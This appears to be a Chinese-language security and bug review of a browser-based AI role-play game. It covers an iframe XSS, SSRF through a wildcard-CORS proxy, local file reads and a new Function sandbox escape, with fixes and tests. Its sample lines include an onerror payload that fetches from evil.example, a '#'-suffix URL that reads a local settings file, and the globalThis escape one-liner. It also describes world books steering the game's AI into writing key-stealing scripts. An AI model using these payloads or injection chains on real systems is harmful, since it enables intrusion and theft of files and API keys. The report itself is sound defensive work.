用一次性探针跑真实代码（探针已删除），**只启用 `defaultEnabled: true` 的两条内置规则**、不做任何用户配置：

输入（完全是正常叙事形状的模型输出）：

```
她低声说道【<img src=x onerror="fetch('https://evil.example/'+document.title)">】然后转身离去。
```

`compileBeautifierSegments` 产出：

```json
{
  "kind": "match",
  "ruleId": "placeholder-emphasis",
  "origin": "rule",
  "captures": ["<img src=x onerror=\"fetch('https://evil.example/'+document.title)\">"],
  "replacement": "<span class=\"ph-emph\"><img src=x onerror=\"fetch(…)\"></span><style>…</style>"
}
```

`origin` 是 `rule`，payload 原样在 `replacement` 里。对应的 CSP（`buildBeautifierFrameCsp('allow', …)`）含 `script-src-attr 'unsafe-inline'` 与 `connect-src http: https: ws: wss: data: blob:`，并注入 `regexStorage` 快照。

`public/data/defaults/beautifier-rules.json` 里 5 条内置规则有 **2 条 `defaultEnabled: true`**（`placeholder-dialogue-card`、`placeholder-emphasis`），4 条用了捕获组。`placeholder-emphasis` 的模式是 `【([^】]+)】` —— 中文叙事里【】出现频率极高。另外 `placeholder-figure` 的模板是 `<img src="$1" alt="$2">`，捕获组直接落进**属性值**，属性逃逸比文本位更省事（虽然该条默认关闭）。

### 影响（含边界）

**不是宿主沦陷。** 该 iframe 仍是 `sandbox="allow-scripts"` 无 same-origin 的不透明源：拿不到父页面 DOM、拿不到应用的 Dexie/localStorage、拿不到 API Key，form / popup / download / 顶层导航 / 嵌套 frame 依旧被封。

**但它拿到了 `block` 档刻意扣下的那三样**：脚本执行、网络出口、共享 `regexStorage` 命名空间；外加在游玩区内渲染任意以假乱真的界面。复核者据此把严重度定为「中」。本报告维持「高」。

### 政策判定：**无限期搁置**（2026-08-09 维护者裁定）

按三条红线逐条核：

| 红线                  | 这条能做到吗                                                                                                                                                   |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ① 访问应用之外的文件  | ❌ `sandbox="allow-scripts"` 且**不带** `allow-same-origin` → 不透明源，无文件系统访问                                                                         |
| ② 危害宿主 / 逃出沙箱 | ❌ 仍在浏览器沙箱内，form / popup / download / 顶层导航 / 嵌套 frame 全封                                                                                      |
| ③ 窃取 API Key        | ❌ Key 在应用同源的 Dexie 里（`api-key-migration.ts` 已迁），不透明帧够不到；它想回打应用的 `/api/*` 也会被 `isOpaqueSandboxOrigin` 的 `Origin: null` 403 挡住 |

它拿到的是脚本执行、网络出口、`regexStorage`、以及在游玩区画假界面 —— **而这几样正是用户自装规则本来就被明确授予的能力**。也就是说，「洗」进去之后拿到的东西，和规则作者自己直接写进模板能拿到的东西**是同一份**。落差为零。

**结论：不修。** 但有两件事值得写进文档而不是留在代码里当默契：

1. `origin: 'rule'` / `'model'` 这个两档之分，在捕获组存在的前提下**基本是装饰性的** —— 任何带 `$1` 的规则都会把模型字节抬进 `allow` 档。要么承认它只是「有没有用捕获」的代名词，要么就按下面「若将来要修」的办法让它名副其实。别让下一个人以为 `block` 档真的挡住了模型字节。
2. 敏感内容外传这一轴按裁定**不算红线**（根 `AGENTS.md` 本来就明确接受「规则可外传该命中的 replacement/capture」），但既然内容是敏感的，值得**知情**：装一条工坊规则等于允许它把命中的叙事片段发到外网。

**若将来要修**（收紧策略时）：让 `applyRule` 记录本次展开是否真的消费了 `$n` / `$&` / `` $` `` / `$'` / `$<name>`，消费了就降到 `scripts: 'block'`（保留样式与图片）。比全量转义对既有工坊规则的破坏小得多。

<details>
<summary>初稿的分析（保留备查 —— 机理描述仍然准确，只是当时按更严的口径评了「高」）</summary>

**按补正后的威胁模型重算（2026-08-09）—— 结论不变，理由要改：**

- 可达性**与内容是否可信完全无关**。上面那次实测用的是**内置默认启用**规则加普通模型输出，没有动任何世界书。所以「内容包现在可信」不削弱这一条。
- 对手面确实收窄了：不再包括内容包里的世界书注入，剩下**工坊安装的规则模板**（第三方，入口开着）、**导入的角色卡**、以及**模型自发产出**。前两者是蓄意面，第三者是意外面 —— 而意外面同样能触发脚本执行，只是不定向。
- 在**内容敏感**这一轴上这条反而更重：该 frame 的 `connect-src` 全开且持有本次命中的正文与捕获，等于给敏感叙事开了一个出网口。初稿引用的根 `AGENTS.md` 那句理由（模型正文会被世界书注入牵着走）现在只对工坊装的书成立，不再对内容包成立 —— 但把它换成「敏感内容外泄」之后，修复的必要性没有下降。

初稿给的两条修法（备查）：① 在 `expandReplacement` 拼接前对捕获值做 HTML 转义（最彻底，但会破坏那些**故意**让捕获携带标记的既有工坊规则）；② 按是否消费捕获降档。方案 ② 与兼容性承诺冲突更小。若真要动，验收应包括：带捕获的规则不得进 `allow` 档、不含捕获引用的模板仍进 `allow` 档、并用 `docs/reviews/2026-08-02-workshop-regex-compatibility.md` 那份 99 条公共正则快照量化降档比例。

</details>

---

## SEC-04（2026-08-01 登记，复发确认）—— BFF 通配 CORS 使其成为可读取的内网 SSRF 中继

**严重度：高** · **区域：`server/app.ts` / `server/routes/proxy.ts`** · **主会话亲验**

### 证据

[`server/app.ts:35-43`](../../server/app.ts) 对**所有**路由挂 `cors({ origin: '*', allowHeaders: ['Content-Type','Authorization','X-Target-Base-URL','api-key'], … })`。前置的唯一来源校验（`app.ts:27-32`）只拒字面量 `Origin: null`（防不透明沙箱帧），真实攻击者源原样放行。

[`server/routes/proxy.ts:47-107`](../../server/routes/proxy.ts) 的 `forward()` 完全从攻击者可控的 `X-Target-Base-URL` 取目标，只校验 `^https?://`，然后把上游 body 直接管道回传。`SSRF_BLOCKLIST`（`proxy.ts:25-30`）只有四个云元数据主机名，loopback 与私有网段是**刻意放行**的 —— 其理由注释写着「这是同源 BFF（key 前端持有，非多租户云服务）」。

**这句前提被同一份代码里的 `origin: '*'` 推翻了。** `app.ts:24` 那段注释本身就说，目的是不让 BFF「变成局域网代理」；但该保护只对不透明源生效。

### 影响

用户在跑 `npm run dev`（dev.bat，也是文档里唯一的启动方式）时访问的**任何**页面，都可以：

```js
fetch('http://localhost:5173/api/models', {
  headers: { 'X-Target-Base-URL': 'http://192.168.1.1' },
}).then((r) => r.text());
```

预检因通配 CORS 通过，响应带 `Access-Control-Allow-Origin: *`，攻击者脚本可**读到 body** —— 对 loopback 与内网的完整读取型 SSRF（端口扫描、路由器/NAS 页面、本地 ollama:11434、ComfyUI:8188）。

**用户的 API Key 不经此泄露** —— BFF 无状态，只转发调用方自己送来的凭据。攻击者拿到的是请求原语与响应内容，不是密钥。

Chrome 的 Private Network Access 只能削弱 public→loopback 这一种情形，Firefox / Safari 未实现，且上一份 review 已明确表示不把 PNA 当作安全边界。

### 建议

把 `origin: '*'` 换成本应用自身来源的白名单（`http://localhost:5173`、`http://127.0.0.1:5173`，以及将来配置的生产源），保留现有的 `null` 拒绝作为附加分支。改完之后 `proxy.ts:22` 那句「这是同源 BFF」才重新成立，私有 IP 放行也就重新站得住。

### 验收标准

- 新增测试：带第三方 `Origin` 的预检与实际请求被拒（403 或不回 ACAO）。
- 新增测试：同源请求与无 `Origin` 的请求（curl / 桌面壳）不受影响。
- 更新 `proxy.ts:18-23` 的理由注释，使其与新的实际策略一致。

---

## SEC-09（新增）—— `X-Target-Base-URL` 末尾一个 `#` 把 BFF 变成任意 URL 取回器

**判定：越红线 ①（访问应用之外的文件）** · **区域：`server/routes/proxy.ts:47-86`** · **主会话实测**

### 证据

`forward(c, suffix)` 的上游 URL 是**字符串直接拼接**：

```ts
const base = baseRaw?.trim().replace(/\/+$/, ''); // 只剃尾部斜杠
// …只校验 ^https?:// ，只用 new URL(base).hostname 查 4 项黑名单…
upstream = await fetch(`${base}${suffix}`, { … });
```

`image.ts` 那几条路由的注释特意强调过「`forward()` 不读查询串，所以 GET 路由必须自己把 query 拼进 suffix」—— 也就是说 **suffix 是固定的、由服务端决定的**，设计上依赖它来限定上游路径。

这个依赖**不成立**：`base` 末尾放一个 `#`，拼出来的 suffix 就整段落进 fragment，永远不会发给服务端。实测：

```
base   = http://127.0.0.1:5173/data/C:/Users/wnc74/.claude/settings.json#
suffix = /view?filename=x
拼接后  = http://127.0.0.1:5173/data/C:/Users/wnc74/.claude/settings.json#/view?filename=x
→ pathname : /data/C:/Users/wnc74/.claude/settings.json
→ hostname : 127.0.0.1        （SSRF 名单只查这个，4 项里没有）
→ fragment : #/view?filename=x （被 fetch 丢弃，不发给服务端）
^https?:// 校验：通过    尾部斜杠剃除：不影响（末字符是 #）
```

于是 BFF 从「只能打上游 API 的固定几条路径」变成**任意主机 + 任意路径的取回器**，而且响应经 `new Response(upstream.body, …)` 原样回传。

### 为什么它越线

单独看，它「只是」SSRF 加强版。但和已确认的两条串起来就越了红线 ①：

1. **SEC-09** —— 攻击者页面控制完整上游 URL；
2. **SEC-03** —— `http://127.0.0.1:5173/data/<Windows 绝对路径>` 经 `resolve()` 逃出 `dataDir`，dev server 以 200 返回任意本地文件；
3. **SEC-04** —— 通配 CORS 让这份响应对攻击者页面**可读**（`/data` 自己不带 CORS 头，但经 BFF 转一手就带上了 `Access-Control-Allow-Origin: *`）。

净结果：**用户在跑 `npm run dev` 时访问的任何网页，都能读走这台机器上的任意文件** —— 包括私有内容仓、`~/.claude/` 下的配置、SSH 私钥。三环各自都已单独确认，`#` 这一环是本次实测新发现的，也正是它把前两条从「内网扫描 + 开发机小问题」抬成红线事件。

### 发行形态依赖（2026-08-09 补正后的关键判断）

正式发行不让用户跑 `npm run dev`，所以上面那条链里的**第 2 环（SEC-03）随 dev server 一起消失**。剩下的 SEC-09 + SEC-04 会不会跟着发行出去，取决于发行怎么做：

- **若发行版带本地 BFF**（`server/app.ts:16` 自陈的「未来 prod（独立 server）」路线，或任何桌面壳内嵌 server）：**两条都在**。届时任何网页仍可驱动这台机器上的 BFF 去取任意 URL 并读回响应 —— 内网扫描、读本地 HTTP 服务，其中 **ComfyUI 的 `/view` 本身就是对外供磁盘文件的接口**，而它正是图像 v2 要求用户在本地跑起来的东西。这一组合值得单独评估是否已构成红线 ①。**不构成红线 ③** —— BFF 无状态，只转发调用方自带的凭据，攻击者拿不到用户的 Key。
- **若发行版不带 BFF**（前端直连各家 provider）：两条都不存在，可整条注销。

仓库现在两种都不是（既无独立 server 入口，也无桌面壳），所以**这条无法在代码里定论，需要按实际发行方案裁定**。

### 建议

按发行形态取舍，但 `forward()` 那处不论如何都该改（成本低、无兼容性代价）：

- `forward()` 用 `new URL(suffix, base)` 之类的**结构化拼接**替代字符串相加，或直接拒绝 `base` 里出现 `#` 与 `?`；同时把 `base` 收敛成「协议 + 主机 + 端口」，丢弃调用方给的 path。
- 若发行带 BFF：SEC-04 的 CORS 白名单一并收紧。
- SEC-03 的规范化包含校验按维护者工作站卫生处理（见该条）。

### 验收标准

- 新增测试：`X-Target-Base-URL` 含 `#` 或 `?` 时被拒（或被规范化掉），并断言最终 `fetch` 到的 URL 的 pathname 确实以约定 suffix 结尾。
- 新增测试：`base` 带 path（`http://h/a/b`）时，上游路径是 `…/a/b` + suffix，而不是被 fragment 截断。

---

## SEC-02（2026-08-01 登记，本次升为红线）—— `new Function` 在应用同源主线程上跑 AI 脚本

**严重度：中** · **区域：`src/sillytavern/script-executor.ts`** · **已修正（严重度由高下调）**

> ✅ **已修复（2026-08-10）** —— `executeScript` 迁到 QuickJS(wasm) realm 隔离
> （`script-backend.ts` + `script-quickjs-backend.ts`）。`new Function` 那条路径**已删除**，
> 未装隔离时 fail-closed（脚本一行不跑），刻意不保留任何可安装的 Legacy 实现。
>
> 验收实测（`script-quickjs-backend.test.ts`，19 条）：构造器逃逸只拿到 guest 自己的全局
> —— 用一个只存在于宿主的哨兵证明拿不到宿主 realm；`fetch` / `indexedDB` / `XMLHttpRequest` /
> `WebSocket` / `process` / `require` 全部不可达；`while(true)` 在 53ms 被中断且不毒化后端
> （旧实现在每次读档时冻死标签页那条意外面一并消失）；脚本之间零泄漏。
>
> 兼容性代价为零：宿主闭包一行没改（`buildSandbox()` 仍是 $ API 唯一真源，副作用照旧经它落进
> `ScriptEffects`），既有 54 条 script-executor 用例**未改一行断言**即在真隔离上通过。
> 每次执行约 0.47ms。
>
> 🔴 **本条的修复不改变 SEC-09 / SEC-04 的结论** —— 那两条与本条无关，仍按发行形态待裁定。
> 另注意「同源代码执行清单」里的 **COR-30**（`effect-runtime.ts:309` 那把上了膛的枪）**仍在**：
> 它是死代码，但谁接线谁就开出第二条同源代码执行路径。

### 证据

[`script-executor.ts:174`](../../src/sillytavern/script-executor.ts) 附近的注释自陈了前提：

> ⚠️ 这不是真正的安全沙箱 —— `new Function` 无法堵住所有逃逸路径（经典绕过：`({}).constructor.constructor("return globalThis")()` 仍能拿回 Function 构造器）。**当前生产链路尚未接通脚本执行**（见 P1-11 …）；正式接通前必须替换为白名单 AST 解释器或 SES/QuickJS 等真正隔离的求值器。

**第二句现在是过期的。** Q-07 把它接上了：`game-pipeline.ts:293-294` 每次运行都调 `wireEffectSystem`；`effect-wiring.ts:149` 调 `executeInit`；`subscription-manager.ts:250` 在每个发布事件上调 `executeScript`；`state-manager.ts:1530` 在时间推进时执行 `onRemove`。脚本文本是 AI 产出且未经过滤入库（`applyAddItem` 直接抄 `scripts: value.scripts`，`state-manager.ts:775`）。`:180-194` 的形参遮蔽名单堵不住注释自己点名的构造器路径，也没有 CPU 预算 —— `init` 里一个 `for(;;);` 就能在每次读档时冻住标签页。

### 为什么这条越了红线 ③（2026-08-09 重判，本报告唯一升到最高档的一条）

初稿把它评为「中」，理由是「需要 AI 被引导才产出恶意脚本」。按维护者裁定的三条红线重判，这个理由不足以降档 —— 决定性的是**它跑在哪里**、**够得到什么**。主会话当场核了两件事：

1. **执行上下文是应用同源主线程。** `grep Worker|iframe|sandbox|postMessage src/sillytavern/script-executor.ts` 只命中它自己那个叫 `sandbox` 的**变量名**（`:170` 的 `buildSandbox`）—— 没有 Worker，没有 iframe，没有 QuickJS。`new Function` 直接在应用页面的 JS 上下文里求值，形参遮蔽（`:180-194`）只是遮住几个名字。文件注释自己点名的 `({}).constructor.constructor("return globalThis")()` 拿回的就是**应用的 `globalThis`**。
2. **API Key 就在那个上下文够得到的地方。** `api-key-migration.ts` 的作用正是把 `settings.apiPool[*].apiKey` **搬进 Dexie**（源在读回校验通过后才擦除）。Dexie = 应用同源的 IndexedDB。逃逸后 `indexedDB` + `fetch` 都在手上。

于是完整链条是：装一个公共工坊项目 → 它的世界书把 char_gen / item_gen 引导成产出带恶意 `scripts.init` 的物品 → 物品原样入库（`applyAddItem` 直抄 `scripts`，`state-manager.ts:775`）→ `wireEffectSystem` 在**每次读档**时执行它 → 逃逸 → 读 Dexie 取 Key → `fetch` 外传。**红线 ③（窃取 API Key）**，而且触发面正是裁定中「有意开放」的那个工坊面 —— 开放暴露面的前提是它不能通到这三条线，这里通了。

顺带一提，即使完全没有对手，这条也有一个**意外面**：AI 手滑写出 `scripts.init = "for(;;);"` 就会在每次读档时冻死标签页（无 CPU 预算）。那一半属于明确容忍项，不构成修复理由 —— 但同一个改法（走 QuickJS + 预算）两个都解决。

### 建议

把 `executeScript` 路由到 `ejs-quickjs-backend.ts` 已经在用的 QuickJS 隔离（就是收口 SEC-02 EJS 那一半的同一道边界），并加墙钟/指令预算。在那之前，至少把「生产链路尚未接通」这句**过期注释改掉** —— 下一个读者会照它做判断。

---

## SEC-05（2026-08-01 登记，复发确认）—— 开发服务器写入口无来源校验

**严重度：中**（原报「高」，复核下调）· **区域：`vite.config.ts:98` / `:139`** · **已修正**

`/api/worldbooks` 与 `/api/defaults` 接受 PUT/POST、缓冲 body、`fs.writeFileSync` 落盘，全程无 Origin / Host / CSRF token / Content-Type / 大小限制。唯一的来源守卫（`vite.config.ts:40`）只拒字面量 `Origin: null`。CORS 中间件根本看不到这两条路由（hono 只认领 `/api/chat|status|models|embeddings|image`），而 CORS 本来也只是读侧控制 —— 一个 `text/plain` 的 `POST` 是免预检的简单请求，写照样落地。`tests/` 对这两个端点零覆盖。

**复核给出的收窄（都成立）：** 仅在 `POEM_CONTENT_DIR` 有值时注册（`dev.bat:39-40` 在同级内容仓存在时会自动设置，所以实践中通常是开的）；只存在于 `configureServer`，`vite preview` 与生产构建都没有；Vite 6.4.3 默认绑 localhost 且带 Host 校验，DNS rebinding 与局域网远程攻击者出局。**因此这是开发机范围的问题，不是出货产品的问题** —— 「高」是出货口径，「中」更诚实。

**建议：** 写入前要求同源的 `Origin`/`Host`（或 `Sec-Fetch-Site: same-origin`），并把方法收紧到 `PUT` + `Content-Type: application/json`，使其无法被免预检的简单请求触达。顺带补上 COR-29 的体积上限与断连处理。

**威胁模型补正（2026-08-09）：不下调，反而更值得修。** 这两个端点写的正是**私有内容仓**。在「内容敏感」的前提下，一个恶意页面盲写覆盖 `agent-config.json` 或世界书，损坏的是那份不进公开仓、可能没有等价备份的素材。「dev-only」限定的是**谁能碰到**，不是**碰到之后损失多大**。

---

## SEC-03（2026-08-01 登记，复发确认）—— `/data` 读路径缺规范化包含校验

**严重度：低**（原报「高」，复核下调为 dev-only）· **区域：`vite.config.ts:79-91`** · **已修正**

读路径只做 `!relPath.includes('..')`，而 20 行之下的写路径用的是正确的守卫，并且**就地写明了理由**（`vite.config.ts:116`）：「仅拒 `'..'` 不够，Windows 绝对路径（如 `C:\evil`）经 `resolve` 会吞掉 worldbooksDir 逃逸到任意位置」。读路径没跟上这次修复。

复核实测：`new URL('/C:/Windows/win.ini','http://localhost').pathname` → `/C:/Windows/win.ini`，`relPath` 不含 `..`，`resolve(dataDir, 'C:/Windows/win.ini')` → `C:\Windows\win.ini`，`existsSync` 为真。另外 WHATWG URL 解析器早已把点段规范化掉，那个 `..` 判断本身是死代码。

**收窄：** 仅 dev（`configureServer`）、仅 `POEM_CONTENT_DIR` 有值时；响应不带 CORS 头，所以普通跨源页面读不到 —— 现实触发条件是同源脚本执行（也就是 SEC-06 那条路），把一个受限的 XSS 升级成开发机任意本地文件读取。两条一起修价值更高。

**威胁模型补正（2026-08-09）：严重度由「低」上调回「中」。** 初稿把它当成「开发机上的一般文件读取」而下调。在「内容敏感」的前提下要重算：这台开发机上恰好放着私有内容仓，而且 `dataDir` 就指向它 —— 连绝对路径逃逸都不用，`/data/worldbooks/*.json` 本身就是内容。SEC-06（同源脚本执行）+ SEC-03（任意本地读）+ `connect-src` 全开的 frame，三者串起来是一条**把私有内容仓读出去并外传**的完整链，且每一环都已确认存在。这是本报告里唯一一条**因为补正而升级**的发现。

**建议：** 套用 `vite.config.ts:117-122` 已有的写法 —— `const rel = relative(dataDir, filePath)`，`rel.startsWith('..') || isAbsolute(rel)` 即拒，并删掉那个已无意义的 `..` 判断。

---

## COR-02 —— 离开游戏页不 abort pipeline，孤儿回合写进后来打开的存档

**严重度：高** · **区域：`src/ui/components/game/GamePage.vue:225`** · **已确认**

### 证据

```ts
onUnmounted(() => {
  window.removeEventListener('keydown', onKeyDown);
  game.isGenerating = false;
  sceneImages.abortAll();
});
```

`pipeline.abort()` 是存在的（`GamePage.vue:244`、`game-pipeline.ts:446`），但这里**没调**。应用没有 `KeepAlive`（`App.vue` 用 `<component :is="viewComponent" :key="ui.currentView" />`），所以 `ui.navigate('home')`（`TopBar.vue:21`，一个**始终可点**的按钮）或 `navigate('settings')`（`:43`）会在生成中途卸载 GamePage。

仍在跑的 `GamePipeline.run()` 之后会走到 `handleAgentResult` → `game.addMessage(...)`，而 game-store 是从 **store** 而不是从 pipeline 取存档号的：`saveId: activeSaveId.value ?? undefined`（`game-store.ts:641`）、`saveMessage({ ...msg, saveId: activeSaveId.value })`（`:611`）。

顺带，`game.isGenerating = false` 还解锁了 `handleSend`，于是重新进入游戏页可以再起一个并发 `run()`。

### 失败场景

存档 A 正在生成（story agent 在飞，约 20 秒）。玩家点「← 首页」，然后打开存档 B。GamePage 重新挂载，`loadSave(B)` 把 `activeSaveId` 置为 B。A 的 pipeline 完成，`addMessage(...)` 把**为 A 生成的正文**追加进 B 的消息列表并以 `saveId: B` 落库 —— 出现在 B 的聊天里、永久留在 B 的历史里。同时这个孤儿回合对 A 提交 StatePatch 与 `advanceTurn()`，而它的 `finally` 又对 B 跑 `refreshFromDb()`。

### 建议

`onUnmounted` 里在清 `isGenerating` **之前**调 `pipeline?.abort()`。并加固 GamePipeline：捕获构造时的 `this.saveId`，当 `game.activeSaveId !== this.saveId` 时跳过 `addMessage` / `refreshFromDb`，使 abort 之后漏网的写入也无法落进别的存档。

### 验收标准

- 测试：生成中卸载 GamePage → 断言 `pipeline.abort()` 被调用。
- 测试：一个 saveId 为 A 的 pipeline 在 store 已切到 B 之后产出结果 → 断言不写入 B。

---

## COR-01 —— UI 整份写回内存 SaveProfile，抹掉引擎当回合的提交

**严重度：中** · **区域：`src/sillytavern/save-profile.ts:148`** · **已修正**

`markNewsRead` / `updateProfile` 接收**整个** `SaveProfile` 并 `db.saveProfiles.put()` 整行写回。两个调用方递进去的是 store 里那份内存快照：`ScenePanel.vue:174`、`QuestsPanel.vue:20`。而 store 那份只在回合末由 `refreshFromDb()` 重读（`game-pipeline.ts:355`）；引擎在回合中会多次写同一行（`applyAffection`、`applyUpdateQuest`、`applyAddNews`、`persistVariables`、`applyTimeAdvance`）。

`AGENTS.md` 的 P1-09 授权的是「写**一个** UI 辅助字段」，没有预见到 variables / quests / affections / fp / gameTime / news 会跟着整行一起回滚。

**复核的关键修正：** 这是**有条件的**丢失更新（需要玩家在生成中途操作面板），不是「每次 UI 写入都无条件回退」。严重度因此定中。

**建议：** 把 P1-09 例外做成真正的字段补丁 —— `markNewsRead(saveId, newsId)` / `setFocusQuest(saveId, name)` 在写入内部重新从 Dexie 读行（或放进 `db.transaction('rw', db.saveProfiles, …)` 做读-改-写），只改 `news[].read` / `focusQuest`。

---

## COR-03 —— `timeUnit: '小时'` 的状态效果在 60 分钟以下的推进里永不衰减

**严重度：中** · **区域：`src/sillytavern/state-manager.ts:1515`** · **主会话亲验**

```ts
if (fx.timeUnit === '小时') {
  fx.remainingTime -= Math.floor(minutes / 60);
} else {
  fx.remainingTime -= minutes;
}
changed = true;
```

`minutes` 来自 AI 的 `delta_time`，正常游玩是 10/15/30 这类每场景值。任何 `minutes < 60` 都是 `-= 0`，而 `changed = true` 仍然强制一次无意义的 `saveCharacter` 写盘；非整数倍还会静默丢弃余数（90 分钟 → 1 小时）。

`'小时'` 是**真实可达**的：`agent-tools.ts:900` 在给 AI 的工具 schema 里就列了 `'回合' | '分钟' | '小时'`，`char-gen-agent.ts:1595` 会解析它。

现有回归测试只推进恰好 60 分钟（`state-manager.test.ts:989`、`:1020`），所以这段算术对测试是不可见的 —— 测试证明了到期/`onRemove` 链路是对的，没有证明喂给它的数是对的。

**建议：** 内部统一按分钟记账（`'小时'` 入库时 `*60`），或累计不足一小时的余数，让部分小时真的攒得起来。补一个「多次 30 分钟推进后 2 小时 buff 应到期」的测试。

---

## COR-04 —— `$status.apply` / `$status.remove` 意图被收集后无人消费

**严重度：中** · **区域：`src/sillytavern/state-manager.ts:1608`（`convertScriptEffects`）** · **已确认**

`convertScriptEffects` 是非战斗路径上 ScriptEffects 的唯一消费者，它只遍历五个桶（`adds` / `removes` / `stackSets` / `hpChanges` / `statChanges`）。`se.statusApplies`、`se.statusRemoves`、`se.events` **从不被读取**。而 `script-executor.ts:86`、`:92` 的注释承诺「由调用方用 buff-registry 执行 → StatePatch」。本该承担这件事的 `status-api.ts`（`applyStatusIntents` / `removeStatusIntents`）**零生产引用**。

这正是根 `AGENTS.md` 记载过的那个缺陷形状 —— 「算出来没落地」—— 在另一处仍然活着。

**可达性：** `agent-tools.ts:896` 的 `get_script_reference`（item_gen/char_gen 写脚本时正好会调）把 `$status.remove(charId, effectId)` 当作可用 API 通告，且没有像其它 stub 那样加警告。AI 产出的物品脚本调用它会**无报错地什么都不做**；用旧的 `$status.add(...)` 反而能work —— 被文档推荐的那个 M2 API 是静默失效的那个。

**建议：** 在 `convertScriptEffects` 里把 `statusApplies` / `statusRemoves` 经 `status-api` 路由出去（目标名解析走同一个 `resolveName` 入口），并对 `se.events` 明确表态：要么经反应轮深度守卫重新发布，要么 warn 后丢弃 —— 不要继续沉默。

---

## COR-05 —— 效果接线只在显式 unequip 时拆除

**严重度：中** · **区域：`src/sillytavern/state-manager.ts:933`** · **已修正**

只有 `applyUnequipItem` 会调 `unwireObject`。`applyEquipItem` 里的**同槽顶替**（`:933-937`）、`applyRemoveItem`、`applyTransferItem` 都只是清掉/删掉物品，不解绑 —— 带脚本的物品的 `$event.on` 订阅会在本次会话余下时间里继续触发并**真的产出反应轮补丁**；陈旧的 `owners` / `_itemUnsubs` 键还会挡住同名物品重新装备时 `init` 的再次运行。

**收窄：** 只影响带 `scripts` 的物品，只在内存中，读档时 `wireEffectSystem` 只对已装备物重新接线，所以会自愈。

**建议：** 抽一个 `detachItemWiring(char, item)`（释放 `_itemUnsubs` 条目 + `unwireObject`），在同槽顶替循环、`applyRemoveItem`、移除角色时（凡 `equippedSlot != null`）统一调用。

---

## COR-06 —— 地图标记从不落库

**严重度：中** · **区域：`src/ui/components/game/MapPanel.vue:215`** · **已确认**

`schedulePersist()` 是个明写的空转：

```ts
persistTimer = setTimeout(() => {
  persistTimer = null;
}, 1000);
```

注释说「markers 持久化…当前由 useMapMarkers 内部处理」。`useMapMarkers.ts` **并没有处理** —— `markers` 是个普通本地 `ref`，其 CRUD 只改这个 ref，全文件无 store、无 Dexie、无 `updateProfile`。引擎侧的写入器 `setMapMarker` / `removeMapMarker`（`save-profile.ts:225,239`）零生产调用方。MapPanel 装在 `AppModal` 里，其 body 是 `v-if="open"`，关闭即销毁组件连同那个 ref。

玩家新增标记、命名、点保存、关掉地图 —— 重开时 `getMapMarkers()` 返回 `[]`，回落到内容仓预设列表，改动全无，且**全程无任何提示**。

**建议：** 让 `schedulePersist` 真的写（防抖进 `setMapMarker`/`removeMapMarker`，或一次性 `worldFlags.mapMarkers = markers.value` + `updateProfile`），并在 `onBeforeUnmount` 里 flush 而不是只清定时器。顺手改掉那句误导性注释。

---

## COR-07 —— 内容包 `execBusy` 互斥设得太晚，且 uninstall 根本不检查

**严重度：中** · **区域：`src/ui/stores/content-store.ts:1138`** · **已确认**

`installPack` 在 `:1102` **读**这个标志，却到 `:1138` 才**设**它 —— 中间隔着三次真实 await（`contentPacks.get`、`loadPlaceholderHashes`、`buildCurrentLibrary` 的四次 `toArray()`）。`uninstallPack` 从头到尾**不读**它，只在 `:1250` 直接赋 `true`。两条路径失败时都调 `rollbackTo(snapshot)` → `importAllData(snapshot)`，那是**整库还原**，不是范围化撤销。而两个 UI 入口（`DataSection.vue` 与 `ContentStatusBanner.vue`）各有各的本地 busy ref，互相看不见；`requestUninstall` 甚至没有本地守卫。

后果：一次失败的安装回滚可以把另一次已经提交的卸载**整库回退**掉，连存档一起。

**收窄：** 内容包装卸是低频的刻意操作，不在主游玩环路上 —— 所以是中不是高。但一旦发生，波及面是整个数据库。

**建议：** `installPack` 在校验早退之后、第一个 await 之前**同步**置 `execBusy = true`，并在外层 `finally` 复位；`uninstallPack` 顶部补同样的检查。更好的做法是把布尔换成共享的 promise 链，让第二个调用方排队而不是被拒。

---

## COR-08 —— QuickJS 每趟只编组一次 `stats`，条目之间互相污染

**严重度：中** · **区域：`src/sillytavern/ejs-quickjs-backend.ts:449`** · **已确认**

`installCapabilities` 每趟跑一次 `globalThis.stats = __ejsData.stats;`。`runEntry` 每条目重播 RNG、重建能力面（`:599-601`），但**从不重新编组或还原 `stats`**；每条目回滚 `restore()`（`:615`）也只碰 `vars` 与 `_local`。

Legacy 后端做法相反，而且它的注释断言两者一致：`deepClone(ctx.stats ?? {})`（`ejs-runtime.ts:668`）附注「🔴 每条目一份深拷贝 … 也与 QuickJS 后端（每条目 JSON 编组）分叉」—— 对生产后端而言这句是**假的**。

复核者用真实 wasm 双后端对跑验证：条目 A `<% stats.主角.背包.push("污染") %>`，条目 B `<%= stats.主角.背包.join(",") %>` —— Legacy 得 `剑`，QuickJS 得 `剑,污染`，两者都 `ok: true`。**更糟的变体**：A 里 push 之后 `throw` —— 条目被回滚、原文注入，但它对只读轴的写入**存活到了提示词里**。

`stats` 是只读轴，作者本不该写它，但它是活的客体对象、没有 freeze 也没有 proxy。

**威胁模型补正（2026-08-09）：这是纯正确性缺陷，不再按安全问题看，但严重度维持中。** 初稿的可达性段把重点放在「工坊第三方世界书写得出来」。内容包可信之后，真正的形态是：**可信作者一次手滑的赋值，会静默污染同一趟里后续的所有条目**，而且两个后端给出不同答案、双方都报 `ok: true`。后果不是被攻击，是**AI 收到一份伪造的上下文且无从复现** —— 换个后端就好了、改一下条目顺序也可能就好了。这类分叉正是最难查的一种，所以不下调。

**建议：** 每条目开头从 pass JSON 重建 `globalThis.stats`（与 `__ejsSnap` 快照同样的手法），并给 `ejs-backend-parity.test.ts` 补一条**跨条目** stats 隔离用例 —— 现有 stats 测试全是单条目的。若确认 `stats` 永远只读，更彻底的做法是在客体侧把它 freeze 掉，让手滑当场报错而不是静默生效。

---

## COR-12 / COR-13 —— 战斗 v3 的两处轮次账目错误

**严重度：中** · **已修正** · **注意：两者都被 BLK-01 遮蔽，修好死锁后才会真正显形**

**COR-12（`combat-v3/coordinator.ts:194`）** —— `SupplyDice` 续骰之后，coordinator 用 `firstInitiative()`（`:273`）恢复，即 `initiativeOrder[0]`，而不是 `initiativeOrder[currentTurnIndex]`。当续骰由非首位单位在回合中触发（attackHit / intentCheck / statusContest / procCheck 耗尽）时，下一条指令带着错误的行动者，`consumeSlot` 以 `INVALID_PHASE` 拒绝，coordinator 直接跳出并以空补丁放弃整场战斗。经 Initiative 阶段恢复的续骰不受影响（该阶段会把 `currentTurnIndex` 归零）。
**建议：** 用内核当前单位（`initiativeOrder[currentTurnIndex]`）替换 `firstInitiative()`，被拒时重读内核当前单位而不是重试同一个行动者。

